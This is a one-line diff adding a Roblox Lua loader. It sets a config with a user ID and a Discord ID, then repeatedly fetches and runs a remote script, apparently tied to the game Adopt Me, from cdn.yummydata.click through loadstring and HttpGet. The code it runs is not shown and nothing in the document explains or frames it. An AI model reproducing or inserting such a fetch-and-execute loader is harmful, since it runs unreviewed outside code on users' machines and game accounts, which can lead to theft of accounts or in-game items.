@@ -1,0 +1,1 @@
+_G.Config={UserID="87bbb0e0-b676-475d-b1be-5715a13f379f",discord_id="547739566174371841",Note="Pc"}local s;for i=1,5 do s=pcall(function()loadstring(game:HttpGet("https://cdn.yummydata.click/scripts/adoptmee"))()end)if s then break end wait(5)end
